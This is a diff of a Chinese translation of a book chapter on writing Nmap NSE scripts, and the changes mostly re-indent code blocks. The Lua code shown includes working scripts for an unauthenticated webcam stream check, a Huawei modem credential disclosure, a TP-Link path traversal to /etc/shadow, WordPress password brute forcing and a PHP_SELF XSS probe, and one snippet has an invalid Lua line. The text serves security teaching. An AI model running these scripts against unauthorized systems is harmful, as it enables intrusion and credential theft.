@@ -1,4 +1,4 @@
-# 第九章。编写您自己的 NSE 脚本
+# 第九章：编写您自己的 NSE 脚本
 
 ### 注意
 
@@ -81,63 +81,63 @@ Trendnet TV-IP110W 网络摄像头允许通过简单请求 URI`/anony/mjpg.cgi`�
 1.  创建文件`http-trendnet-tvip110w.nse`，并从填写 NSE 脚本基本信息字段开始：
 
 ```
-    description = [[
-    Attempts to detect webcams Trendnet TV-IP110W vulnerable to unauthenticated access to the video stream by querying the URI "/anony/mjpg.cgi".
+description = [[
+Attempts to detect webcams Trendnet TV-IP110W vulnerable to unauthenticated access to the video stream by querying the URI "/anony/mjpg.cgi".
 
-    Original advisory: http://console-cowboys.blogspot.com/2012/01/trendnet-cameras-i-always-feel-like.html
-    ]]
+Original advisory: http://console-cowboys.blogspot.com/2012/01/trendnet-cameras-i-always-feel-like.html
+]]
 
-    categories = {"exploit","vuln"}
-    ```
+categories = {"exploit","vuln"}
+```
 
 1.  我们加载将需要的库。请注意，此格式对应于 Nmap 6.x：
 
 ```
-    local http = require "http"
-    local shortport = require "shortport"
-    local stdnse = require "stdnse"
-    ```
+local http = require "http"
+local shortport = require "shortport"
+local stdnse = require "stdnse"
+```
 
 1.  我们定义我们的执行规则。我们使用别名`shortport.http`告诉 Nmap 在找到 Web 服务器时执行脚本：
 
 ```
-    portrule = shortport.http
-    ```
+portrule = shortport.http
+```
 
 1.  我们的主要功能将识别 404 响应的类型，并通过向`/anony/mjpg.cgi`发送 HTTP 请求并检查状态码 200 来确定网络摄像头是否容易受到未经授权的访问：
 
 ```
-    action = function(host, port)
-      local uri = "/anony/mjpg.cgi"
+action = function(host, port)
+  local uri = "/anony/mjpg.cgi"
 
-      local _, status_404, resp_404 = http.identify_404(host, port)
-      if status_404 == 200 then
-        stdnse.print_debug(1, "%s: Web server returns ambiguous response. Trendnet webcams return standard 404 status responses. Exiting.", SCRIPT_NAME)
-        return
-      end
+  local _, status_404, resp_404 = http.identify_404(host, port)
+  if status_404 == 200 then
+    stdnse.print_debug(1, "%s: Web server returns ambiguous response. Trendnet webcams return standard 404 status responses. Exiting.", SCRIPT_NAME)
+    return
+  end
 
-      stdnse.print_debug(1, "%s: HTTP HEAD %s", SCRIPT_NAME, uri)
-      local resp = http.head(host, port, uri)
-      if resp.status and resp.status == 200 then
-        return string.format("Trendnet TV-IP110W video feed is unprotected:http://%s/anony/mjpg.cgi", host.ip)
-      end
-    end
-    ```
+  stdnse.print_debug(1, "%s: HTTP HEAD %s", SCRIPT_NAME, uri)
+  local resp = http.head(host, port, uri)
+  if resp.status and resp.status == 200 then
+    return string.format("Trendnet TV-IP110W video feed is unprotected:http://%s/anony/mjpg.cgi", host.ip)
+  end
+end
+```
 
 1.  现在只需针对目标运行 NSE 脚本：
 
 ```
-    $ nmap -p80 -n -Pn --script http-trendnet-tvip110w.nse <target>
+$ nmap -p80 -n -Pn --script http-trendnet-tvip110w.nse <target>
 
-    ```
+```
 
 1.  如果找到易受攻击的网络摄像头，您将看到以下输出：
 
 ```
-    PORT   STATE SERVICE REASON
-    80/tcp open  http    syn-ack
-    |_http-trendnet-tvip110w: Trendnet TV-IP110W video feed is unprotected:http://192.168.4.20/anony/mjpg.cgi
-    ```
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+|_http-trendnet-tvip110w: Trendnet TV-IP110W video feed is unprotected:http://192.168.4.20/anony/mjpg.cgi
+```
 
 带有文档标签的完整脚本可以从[`github.com/cldrn/nmap-nse-scripts/blob/master/scripts/6.x/http-trendnet-tvip110w.nse`](https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/6.x/http-trendnet-tvip110w.nse)下载。
 
@@ -310,98 +310,98 @@ Nmap 脚本引擎提供了一个强大的库，用于处理网络 I/O 操作，�
 1.  首先，创建文件`huawei-hg5xx-udpinfo.nse`并定义信息标签：
 
 ```
-    description=[[
-    Tries to obtain the PPPoE credentials, MAC address, firmware version and IP information of the aDSL modemsHuawei Echolife 520, 520b, 530 and possibly others by exploiting an information disclosure vulnerability via UDP.
+description=[[
+Tries to obtain the PPPoE credentials, MAC address, firmware version and IP information of the aDSL modemsHuawei Echolife 520, 520b, 530 and possibly others by exploiting an information disclosure vulnerability via UDP.
 
-    The script works by sending a crafted UDP packet to port 43690 and then parsing the response that containsthe configuration values. This exploit has been reported to be blocked in some ISPs, in those cases the exploit seems to work fine in local networks.
-    Vulnerability discovered by Pedro Joaquin. No CVE assigned.
+The script works by sending a crafted UDP packet to port 43690 and then parsing the response that containsthe configuration values. This exploit has been reported to be blocked in some ISPs, in those cases the exploit seems to work fine in local networks.
+Vulnerability discovered by Pedro Joaquin. No CVE assigned.
 
-    References:
-    * http://www.hakim.ws/huawei/HG520_udpinfo.tar.gz
-    * http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure
-    ]]
-    ```
+References:
+* http://www.hakim.ws/huawei/HG520_udpinfo.tar.gz
+* http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure
+]]
+```
 
 1.  加载所需的库（Nmap 6.x 格式）：
 
 ```
-    local "stdnse" = require "stdnse"
-    local "io" = require "io"
-    local "shortport" = require "shortport"
-    ```
+local "stdnse" = require "stdnse"
+local "io" = require "io"
+local "shortport" = require "shortport"
+```
 
 1.  定义执行规则：
 
 ```
-    portrule = shortport.portnumber(43690, "udp", {"open", "open|filtered","filtered"})
-    ```
+portrule = shortport.portnumber(43690, "udp", {"open", "open|filtered","filtered"})
+```
 
 1.  创建一个函数，从文件中加载 UDP 负载：
 
 ```
-    load_udp_payload = function()
-      local payload_l = nmap.fetchfile(PAYLOAD_LOCATION)
-      if (not(payload_l)) then
-        stdnse.print_debug(1, "%s:Couldn't locate payload %s", SCRIPT_NAME, PAYLOAD_LOCATION)
-        return
-      end
-      local payload_h = io.open(payload_l, "rb")
-      local payload = payload_h:read("*a")
-      if (not(payload)) then
-        stdnse.print_debug(1, "%s:Couldn't load payload %s", SCRIPT_NAME, payload_l)
-        if nmap.verbosity()>=2 then
-          return "[Error] Couldn't load payload"
-        end
-        return
-      end
-
-      payload_h:flush()
-      payload_h:close()
-      return payload
+load_udp_payload = function()
+  local payload_l = nmap.fetchfile(PAYLOAD_LOCATION)
+  if (not(payload_l)) then
+    stdnse.print_debug(1, "%s:Couldn't locate payload %s", SCRIPT_NAME, PAYLOAD_LOCATION)
+    return
+  end
+  local payload_h = io.open(payload_l, "rb")
+  local payload = payload_h:read("*a")
+  if (not(payload)) then
+    stdnse.print_debug(1, "%s:Couldn't load payload %s", SCRIPT_NAME, payload_l)
+    if nmap.verbosity()>=2 then
+      return "[Error] Couldn't load payload"
     end
-    ```
+    return
+  end
+
+  payload_h:flush()
+  payload_h:close()
+  return payload
+end
+```
 
 1.  创建一个函数，创建一个 NSE 套接字并发送特殊的 UDP 数据包：
 
 ```
-    send_udp_payload = function(ip, timeout, payload)
-      local data
-      stdnse.print_debug(2, "%s:Sending UDP payload", SCRIPT_NAME)
-      local socket = nmap.new_socket("udp")
-      socket:set_timeout(tonumber(timeout))
-      local status = socket:connect(ip, HUAWEI_UDP_PORT, "udp")
-      if (not(status)) then return end
-      status = socket:send(payload)
-      if (not(status)) then return end
-      status, data = socket:receive()
-      if (not(status)) then
-        socket:close()
-        return
-      end
-      socket:close()
-      return data
-    end
-    ```
+send_udp_payload = function(ip, timeout, payload)
+  local data
+  stdnse.print_debug(2, "%s:Sending UDP payload", SCRIPT_NAME)
+  local socket = nmap.new_socket("udp")
+  socket:set_timeout(tonumber(timeout))
+  local status = socket:connect(ip, HUAWEI_UDP_PORT, "udp")
+  if (not(status)) then return end
+  status = socket:send(payload)
+  if (not(status)) then return end
+  status, data = socket:receive()
+  if (not(status)) then
+    socket:close()
+    return
+  end
+  socket:close()
+  return data
+end
+```
 
 1.  添加主要方法，加载并发送 UDP 负载：
 
 ```
-    action = function(host, port)
-      local timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 3000
-      local payload = load_udp_payload()
-      local response = send_udp_payload(host.ip, timeout, payload)
-      if response then
-        return parse_resp(response)
-      end
-    end
-    ```
+action = function(host, port)
+  local timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 3000
+  local payload = load_udp_payload()
+  local response = send_udp_payload(host.ip, timeout, payload)
+  if response then
+    return parse_resp(response)
+  end
+end
+```
 
 1.  您可以使用以下命令运行最终脚本：
 
 ```
-    # nmap -sU -p43690 --script huawei-hg5xx-udpinfo <target>
+# nmap -sU -p43690 --script huawei-hg5xx-udpinfo <target>
 
-    ```
+```
 
 一个有漏洞的设备将返回以下输出：
 
@@ -550,64 +550,64 @@ $ nmap -p80 --script http-google-email -d4 <target>
 1.  创建文件`http-tplink-dir-traversal.nse`并完成 NSE 信息标签：
 
 ```
-    description = [[
-    Exploits a directory traversal vulnerability existing in several TP-Link wireless routers. Attackers may exploit this vulnerability to read any of the configuration and password files remotely and without authentication.
+description = [[
+Exploits a directory traversal vulnerability existing in several TP-Link wireless routers. Attackers may exploit this vulnerability to read any of the configuration and password files remotely and without authentication.
 
-    This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but there are several models that use the same HTTP server so I believe they could be vulnerable as well. I appreciateany help confirming the vulnerability in other models.
+This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but there are several models that use the same HTTP server so I believe they could be vulnerable as well. I appreciateany help confirming the vulnerability in other models.
 
-    Advisory:
-    * http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740
+Advisory:
+* http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740
 
-    Other interesting files:
-    * /tmp/topology.cnf (Wireless configuration)
-    * /tmp/ath0.ap_bss (Wireless encryption key)
-    ]]
-    ```
+Other interesting files:
+* /tmp/topology.cnf (Wireless configuration)
+* /tmp/ath0.ap_bss (Wireless encryption key)
+]]
+```
 
 1.  加载所需的库（Nmap 6.x 格式）：
 
 ```
-    local http = require "http"
-    local io = require "io"
-    local shortport = require "shortport"
-    local stdnse = require "stdnse"
-    local string = require "string"
-    local vulns = require "vulns"
-    ```
+local http = require "http"
+local io = require "io"
+local shortport = require "shortport"
+local stdnse = require "stdnse"
+local string = require "string"
+local vulns = require "vulns"
+```
 
 1.  使用`shortport`库的帮助定义执行规则：
 
 ```
-    portrule = shortport.http
-    ```
+portrule = shortport.http
+```
 
 1.  编写一个函数来发送路径遍历请求并确定 Web 应用程序是否易受攻击：
 
 ```
-    local function check_vuln(host, port)
-      local evil_uri = "/help/../../etc/shadow"
-      stdnse.print_debug(1, "%s:HTTP GET %s", SCRIPT_NAME, evil_uri)
-      local response = http.get(host, port, evil_uri)
-      if response.body and response.status==200 and response.body:match("root:") then
-        stdnse.print_debug(1, "%s:Pattern 'root:' found.", SCRIPT_NAME, response.body)
-        return true
-      end
-      return false
-    end
-    ```
+local function check_vuln(host, port)
+  local evil_uri = "/help/../../etc/shadow"
+  stdnse.print_debug(1, "%s:HTTP GET %s", SCRIPT_NAME, evil_uri)
+  local response = http.get(host, port, evil_uri)
+  if response.body and response.status==200 and response.body:match("root:") then
+    stdnse.print_debug(1, "%s:Pattern 'root:' found.", SCRIPT_NAME, response.body)
+    return true
+  end
+  return false
+end
+```
 
 1.  读取并解析响应中的文件，借助 Lua 捕获(`.*`)的一些帮助：
 
 ```
-    local _, _, rfile_content = string.find(response.body, 'SCRIPT>(.*)')
-    ```
+local _, _, rfile_content = string.find(response.body, 'SCRIPT>(.*)')
+```
 
 1.  最后，使用以下命令执行脚本：
 
 ```
-    $ nmap -p80 --script http-tplink-dir-traversal.nse <target>
+$ nmap -p80 --script http-tplink-dir-traversal.nse <target>
 
-    ```
+```
 
 易受攻击的设备将产生以下输出：
 
@@ -832,138 +832,138 @@ end
 1.  创建文件`http-wordpress-brute.nse`并填写信息标签：
 
 ```
-    description = [[
-    performs brute force password auditing against Wordpress CMS/blog installations.
+description = [[
+performs brute force password auditing against Wordpress CMS/blog installations.
 
-    This script uses the unpwdb and brute libraries to perform password guessing. Any successful guesses arestored using the credentials library.
+This script uses the unpwdb and brute libraries to perform password guessing. Any successful guesses arestored using the credentials library.
 
-    Wordpress default uri and form names:
-    * Default uri:<code>wp-login.php</code>
-    * Default uservar: <code>log</code>
-    * Default passvar: <code>pwd</code>
-    ]]
-    author = "Paulino Calderon <calderon()websec.mx>"
-    license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
-    categories = {"intrusive", "brute"}
-    ```
+Wordpress default uri and form names:
+* Default uri:<code>wp-login.php</code>
+* Default uservar: <code>log</code>
+* Default passvar: <code>pwd</code>
+]]
+author = "Paulino Calderon <calderon()websec.mx>"
+license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+categories = {"intrusive", "brute"}
+```
 
 1.  加载所需的库（Nmap 6.x 格式）：
 
 ```
-    local brute = require "brute"
-    local creds = require "creds"
-    local http = require "http"
-    local shortport = require "shortport"
-    local stdnse = require "stdnse"
-    ```
+local brute = require "brute"
+local creds = require "creds"
+local http = require "http"
+local shortport = require "shortport"
+local stdnse = require "stdnse"
+```
 
 1.  使用暴力引擎的 NSE 脚本需要按照以下方式实现其`Driver`类：
 
 ```
-    Driver = {
-      new = function(self, host, port, options)
-      ...
-      end,
-      check = function(self)
-      ...
-      end
-      login = function(self)
-      ...
-      end
-      connect = function(self)
-      ...
-      end
-      disconnect = function(self)
-      ...
-      end
-    }
-    ```
+Driver = {
+  new = function(self, host, port, options)
+  ...
+  end,
+  check = function(self)
+  ...
+  end
+  login = function(self)
+  ...
+  end
+  connect = function(self)
+  ...
+  end
+  disconnect = function(self)
+  ...
+  end
+}
+```
 
 1.  让我们创建与我们的脚本相关的相应函数：
 
 +   `constructor`函数负责读取脚本参数并设置脚本可能需要的任何其他选项：
 
 ```
-                new = function(self, host, port, options)
-                    local o = {}
-                    setmetatable(o, self)
-                    self.__index = self
-                    o.host = stdnse.get_script_args('http-wordpress-brute.hostname') or host
-                    o.port = port
-                    o.uri = stdnse.get_script_args('http-wordpress-brute.uri') or DEFAULT_WP_URI
-                    o.options = options
-                    return o
-                  end,
-        ```
+        new = function(self, host, port, options)
+            local o = {}
+            setmetatable(o, self)
+            self.__index = self
+            o.host = stdnse.get_script_args('http-wordpress-brute.hostname') or host
+            o.port = port
+            o.uri = stdnse.get_script_args('http-wordpress-brute.uri') or DEFAULT_WP_URI
+            o.options = options
+            return o
+          end,
+```
 
 +   `connect`函数可以留空，因为在这种情况下不需要连接到套接字；我们正在对 HTTP 服务执行暴力破解密码审计攻击（库`http`在我们的下一个登录函数中使用时负责打开和关闭必要的套接字）：
 
 ```
-                 connect = function( self )
-                    return true
-                  end,
-        ```
+         connect = function( self )
+            return true
+          end,
+```
 
 +   `disconnect`函数也可以在这个脚本中留空：
 
 ```
-                disconnect = function( self )
-                    return true
-                  end,
-        ```
+        disconnect = function( self )
+            return true
+          end,
+```
 
 +   `check`函数用作在我们开始暴力破解密码攻击之前的健全性检查。请注意，这个函数最近被标记为不推荐使用，这些检查将需要在将来的版本中移动到主要部分：
 
 ```
-                  check = function( self )
-                    local response = http.get( self.host, self.port, self.uri )
-                    stdnse.print_debug(1, "HTTP GET %s%s", stdnse.get_hostname(self.host),self.uri)
-                    -- Check if password field is there
-                    if ( response.status == 200 and response.body:match('type=[\'"]password[\'"]')) then
-                      stdnse.print_debug(1, "Initial check passed. Launching brute force attack")
-                      return true
-                    else
-                      stdnse.print_debug(1, "Initial check failed. Password field wasn't found")
-                    end
+          check = function( self )
+            local response = http.get( self.host, self.port, self.uri )
+            stdnse.print_debug(1, "HTTP GET %s%s", stdnse.get_hostname(self.host),self.uri)
+            -- Check if password field is there
+            if ( response.status == 200 and response.body:match('type=[\'"]password[\'"]')) then
+              stdnse.print_debug(1, "Initial check passed. Launching brute force attack")
+              return true
+            else
+              stdnse.print_debug(1, "Initial check failed. Password field wasn't found")
+            end
 
-                    return false
-        ```
+            return false
+```
 
 +   最后是`login`函数：
 
 ```
-                 login = function( self, username, password )
-                    -- Note the no_cache directive
-                    stdnse.print_debug(2, "HTTP POST %s%s\n", self.host, self.uri)
-                    local response = http.post( self.host, self.port, self.uri, { no_cache = true }, nil, { [self.options.uservar] = username, [self.options.passvar] = password } )
-                        -- This redirect is taking us to /wp-admin
-                    if response.status == 302 then
-                      local c = creds.Credentials:new( SCRIPT_NAME, self.host, self.port )
-                      c:add(username, password, creds.State.VALID )
-                      return true, brute.Account:new( username, password, "OPEN")
-                    end
+         login = function( self, username, password )
+            -- Note the no_cache directive
+            stdnse.print_debug(2, "HTTP POST %s%s\n", self.host, self.uri)
+            local response = http.post( self.host, self.port, self.uri, { no_cache = true }, nil, { [self.options.uservar] = username, [self.options.passvar] = password } )
+                -- This redirect is taking us to /wp-admin
+            if response.status == 302 then
+              local c = creds.Credentials:new( SCRIPT_NAME, self.host, self.port )
+              c:add(username, password, creds.State.VALID )
+              return true, brute.Account:new( username, password, "OPEN")
+            end
 
-                    return false, brute.Error:new( "Incorrect password" )
-                  end,
-        ```
+            return false, brute.Error:new( "Incorrect password" )
+          end,
+```
 
 1.  我们留下了代码的主要部分来初始化、配置和启动暴力引擎：
 
 ```
-            action = function( host, port )
-              local status, result, engine
-              local uservar = stdnse.get_script_args('http-wordpress-brute.uservar') or DEFAULT_WP_USERVAR
-              local passvar = stdnse.get_script_args('http-wordpress-brute.passvar') or DEFAULT_WP_PASSVAR
-              local thread_num = stdnse.get_script_args("http-wordpress-brute.threads") or DEFAULT_THREAD_NUM
+        action = function( host, port )
+          local status, result, engine
+          local uservar = stdnse.get_script_args('http-wordpress-brute.uservar') or DEFAULT_WP_USERVAR
+          local passvar = stdnse.get_script_args('http-wordpress-brute.passvar') or DEFAULT_WP_PASSVAR
+          local thread_num = stdnse.get_script_args("http-wordpress-brute.threads") or DEFAULT_THREAD_NUM
 
-              engine = brute.Engine:new( Driver, host, port, { uservar = uservar, passvar = passvar } )
-              engine:setMaxThreads(thread_num)
-              engine.options.script_name = SCRIPT_NAME
-              status, result = engine:start()
+          engine = brute.Engine:new( Driver, host, port, { uservar = uservar, passvar = passvar } )
+          engine:setMaxThreads(thread_num)
+          engine.options.script_name = SCRIPT_NAME
+          status, result = engine:start()
 
-              return result
-            end
-    ```
+          return result
+        end
+```
 
 ## 工作原理...
 
@@ -1061,23 +1061,23 @@ NSE 库`nmap`的官方文档可以在[`nmap.org/nsedoc/lib/nmap.html`](http://nm
 +   `user`：对于`userdb`中列出的每个用户，将尝试`passdb`中的每个密码
 
 ```
-    $ nmap --script http-wordpress-brute --script-args brute.mode=user <target>
+$ nmap --script http-wordpress-brute --script-args brute.mode=user <target>
 
-    ```
+```
 
 +   `pass`：对于`passdb`中列出的每个密码，将尝试`userdb`中的每个用户
 
 ```
-    $ nmap --script http-wordpress-brute --script-args brute.mode=pass <target>
+$ nmap --script http-wordpress-brute --script-args brute.mode=pass <target>
 
-    ```
+```
 
 +   `creds`：这需要额外的参数`brute.credfile`
 
 ```
-    $ nmap --script http-wordpress-brute --script-args brute.mode=creds,brute.credfile=./creds.txt <target>
+$ nmap --script http-wordpress-brute --script-args brute.mode=creds,brute.credfile=./creds.txt <target>
 
-    ```
+```
 
 ## 另请参阅
 
@@ -1114,173 +1114,173 @@ NSE 库`nmap`的官方文档可以在[`nmap.org/nsedoc/lib/nmap.html`](http://nm
 1.  创建脚本文件`http-phpself-xss.nse`并填写信息标签：
 
 ```
-    description=[[
-    Crawls a web server and attempts to find PHP files vulnerable to reflected cross site scripting via the variable $_SERVER["PHP_SELF"].
+description=[[
+Crawls a web server and attempts to find PHP files vulnerable to reflected cross site scripting via the variable $_SERVER["PHP_SELF"].
 
-    This script crawls the web server to create a list of PHP files and then sends an attack vector/probe to identify PHP_SELF cross site scripting vulnerabilities.
-    PHP_SELF XSS refers to reflected cross site scripting vulnerabilities caused by the lack of sanitation of the variable <code>$_SERVER["PHP_SELF"]</code> in PHP scripts. This variable iscommonly used in php scripts that display forms and when the script file name  is needed.
+This script crawls the web server to create a list of PHP files and then sends an attack vector/probe to identify PHP_SELF cross site scripting vulnerabilities.
+PHP_SELF XSS refers to reflected cross site scripting vulnerabilities caused by the lack of sanitation of the variable <code>$_SERVER["PHP_SELF"]</code> in PHP scripts. This variable iscommonly used in php scripts that display forms and when the script file name  is needed.
 
-    Examples of Cross Site Scripting vulnerabilities in the variable $_SERVER[PHP_SELF]:
-    *http://www.securityfocus.com/bid/37351
-    *http://software-security.sans.org/blog/2011/05/02/spot-vuln-percentage
-    *http://websec.ca/advisories/view/xss-vulnerabilities-mantisbt-1.2.x
+Examples of Cross Site Scripting vulnerabilities in the variable $_SERVER[PHP_SELF]:
+*http://www.securityfocus.com/bid/37351
+*http://software-security.sans.org/blog/2011/05/02/spot-vuln-percentage
+*http://websec.ca/advisories/view/xss-vulnerabilities-mantisbt-1.2.x
 
-    The attack vector/probe used is: <code>/'"/><script>alert(1)</script></code>
-    ]]
-    author = "Paulino Calderon <calderon()websec.mx>"
-    license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
-    categories = {"fuzzer", "intrusive", "vuln"}
-    ```
+The attack vector/probe used is: <code>/'"/><script>alert(1)</script></code>
+]]
+author = "Paulino Calderon <calderon()websec.mx>"
+license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+categories = {"fuzzer", "intrusive", "vuln"}
+```
 
 1.  加载所需的库（Nmap 6.x 格式）：
 
 ```
-    local http = require 'http'
-    local httpspider = require 'httpspider'
-    local shortport = require 'shortport'
-    local url = require 'url'
-    local stdnse = require 'stdnse'
-    local vulns = require 'vulns'
-    ```
+local http = require 'http'
+local httpspider = require 'httpspider'
+local shortport = require 'shortport'
+local url = require 'url'
+local stdnse = require 'stdnse'
+local vulns = require 'vulns'
+```
 
 1.  定义脚本应在遇到别名为`shortport.http`的 HTTP 服务器时运行：
 
 ```
-    portrule = shortport.http
-    ```
+portrule = shortport.http
+```
 
 1.  编写一个函数，该函数将从爬虫接收一个 URI 并发送一个注入探针：
 
 ```
-    local PHP_SELF_PROBE = '/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E'
-    local probes = {}
-    local function launch_probe(host, port, uri)
-      local probe_response
-      --We avoid repeating probes.
-      --This is a temp fix since httpspider do not keep track of previously parsed links at the moment.
-      if probes[uri] then
-        return false
-      end
+local PHP_SELF_PROBE = '/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E'
+local probes = {}
+local function launch_probe(host, port, uri)
+  local probe_response
+  --We avoid repeating probes.
+  --This is a temp fix since httpspider do not keep track of previously parsed links at the moment.
+  if probes[uri] then
+    return false
+  end
 
-      stdnse.print_debug(1, "%s:HTTP GET %s%s", SCRIPT_NAME, uri, PHP_SELF_PROBE)
-      probe_response = http.get(host, port, uri .. PHP_SELF_PROBE)
+  stdnse.print_debug(1, "%s:HTTP GET %s%s", SCRIPT_NAME, uri, PHP_SELF_PROBE)
+  probe_response = http.get(host, port, uri .. PHP_SELF_PROBE)
 
-      --save probe in list to avoid repeating it
-      probes[uri] = true
+  --save probe in list to avoid repeating it
+  probes[uri] = true
 
-      if check_probe_response(probe_response) then
-        return true
-      end
-      return false
-    end
-    ```
+  if check_probe_response(probe_response) then
+    return true
+  end
+  return false
+end
+```
 
 1.  添加一个函数，用于检查响应主体，以确定 PHP 文件是否易受攻击：
 
 ```
-    local function check_probe_response(response)
-      stdnse.print_debug(3, "Probe response:\n%s", response.body)
-      if string.find(response.body, "'\"/><script>alert(1)</script>", 1, true) ~= nil then
-        return true
-      end
-      return false
-    end
-    ```
+local function check_probe_response(response)
+  stdnse.print_debug(3, "Probe response:\n%s", response.body)
+  if string.find(response.body, "'\"/><script>alert(1)</script>", 1, true) ~= nil then
+    return true
+  end
+  return false
+end
+```
 
 1.  在脚本的主要部分，我们将添加读取脚本参数、初始化`http`爬虫、设置漏洞信息，并迭代页面以启动探测（如果找到 PHP 文件）的代码：
 
 ```
-    action = function(host, port)
-      local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
-      local timeout = stdnse.get_script_args(SCRIPT_NAME..'.timeout') or 10000
-      local crawler = httpspider.Crawler:new(host, port, uri, { scriptname = SCRIPT_NAME } )
-      crawler:set_timeout(timeout)
+action = function(host, port)
+  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
+  local timeout = stdnse.get_script_args(SCRIPT_NAME..'.timeout') or 10000
+  local crawler = httpspider.Crawler:new(host, port, uri, { scriptname = SCRIPT_NAME } )
+  crawler:set_timeout(timeout)
 
-      local vuln = {
-           title = 'Unsafe use of $_SERVER["PHP_SELF"] in PHP files',
-           state = vulns.STATE.NOT_VULN,
-           description = [[
-    PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.
-           ]],
-           references = {
-               'http://php.net/manual/en/reserved.variables.server.php',
-               'https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)'
-           }
-         }
-      local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
+  local vuln = {
+       title = 'Unsafe use of $_SERVER["PHP_SELF"] in PHP files',
+       state = vulns.STATE.NOT_VULN,
+       description = [[
+PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.
+       ]],
+       references = {
+           'http://php.net/manual/en/reserved.variables.server.php',
+           'https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)'
+       }
+     }
+  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 
-      local vulnpages = {}
-      local probed_pages= {}
+  local vulnpages = {}
+  local probed_pages= {}
 
-      while(true) do
-        local status, r = crawler:crawl()
-        if ( not(status) ) then
-          if ( r.err ) then
-            return stdnse.format_output(true, "ERROR: %s", r.reason)
-          else
-            break
-          end
-        end
-
-        local parsed = url.parse(tostring(r.url))
-
-        --Only work with .php files
-        if ( parsed.path and parsed.path:match(".*.php") ) then
-            --The following port/scheme code was seen in http-backup-finder and its neat =)
-            local host, port = parsed.host, parsed.port
-            if ( not(port) ) then
-              port = (parsed.scheme == 'https') and 443
-              port = port or ((parsed.scheme == 'http') and 80)
-            end
-            local escaped_link = parsed.path:gsub(" ", "%%20")
-            if launch_probe(host,port,escaped_link) then
-              table.insert(vulnpages, parsed.scheme..'://'..host..escaped_link..PHP_SELF_PROBE)
-            end
-          end
+  while(true) do
+    local status, r = crawler:crawl()
+    if ( not(status) ) then
+      if ( r.err ) then
+        return stdnse.format_output(true, "ERROR: %s", r.reason)
+      else
+        break
       end
-
-      if ( #vulnpages > 0 ) then
-        vuln.state = vulns.STATE.EXPLOIT
-        vulnpages.name = "Vulnerable files with proof of concept:"
-        vuln.extra_info = stdnse.format_output(true, vulnpages)..crawler:getLimitations()
-      end
-
-      return vuln_report:make_output(vuln)
-
     end
-    ```
+
+    local parsed = url.parse(tostring(r.url))
+
+    --Only work with .php files
+    if ( parsed.path and parsed.path:match(".*.php") ) then
+        --The following port/scheme code was seen in http-backup-finder and its neat =)
+        local host, port = parsed.host, parsed.port
+        if ( not(port) ) then
+          port = (parsed.scheme == 'https') and 443
+          port = port or ((parsed.scheme == 'http') and 80)
+        end
+        local escaped_link = parsed.path:gsub(" ", "%%20")
+        if launch_probe(host,port,escaped_link) then
+          table.insert(vulnpages, parsed.scheme..'://'..host..escaped_link..PHP_SELF_PROBE)
+        end
+      end
+  end
+
+  if ( #vulnpages > 0 ) then
+    vuln.state = vulns.STATE.EXPLOIT
+    vulnpages.name = "Vulnerable files with proof of concept:"
+    vuln.extra_info = stdnse.format_output(true, vulnpages)..crawler:getLimitations()
+  end
+
+  return vuln_report:make_output(vuln)
+
+end
+```
 
 要运行脚本，请使用以下命令：
 
 ```
-    $ nmap -p80 --script http-phpself-xss.nse <target>
+$ nmap -p80 --script http-phpself-xss.nse <target>
 
-    ```
+```
 
 如果 PHP 文件通过`$_SERVER["PHP_SELF"]`注入易受跨站脚本攻击，输出将类似于这样：
 
 ```
-    PORT   STATE SERVICE REASON
-    80/tcp open  http    syn-ack
-     http-phpself-xss:
-       VULNERABLE:
-       Unsafe use of $_SERVER["PHP_SELF"] in PHP files
-         State: VULNERABLE (Exploitable)
-         Description:
-           PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+ http-phpself-xss:
+   VULNERABLE:
+   Unsafe use of $_SERVER["PHP_SELF"] in PHP files
+     State: VULNERABLE (Exploitable)
+     Description:
+       PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.
 
-         Extra information:
+     Extra information:
 
-       Vulnerable files with proof of concept:
-         http://calder0n.com/sillyapp/three.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
-         http://calder0n.com/sillyapp/secret/2.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
-         http://calder0n.com/sillyapp/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
-         http://calder0n.com/sillyapp/secret/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
-       Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=calder0n.com
-         References:
-           https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
-          http://php.net/manual/en/reserved.variables.server.php
-    ```
+   Vulnerable files with proof of concept:
+     http://calder0n.com/sillyapp/three.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
+     http://calder0n.com/sillyapp/secret/2.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
+     http://calder0n.com/sillyapp/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
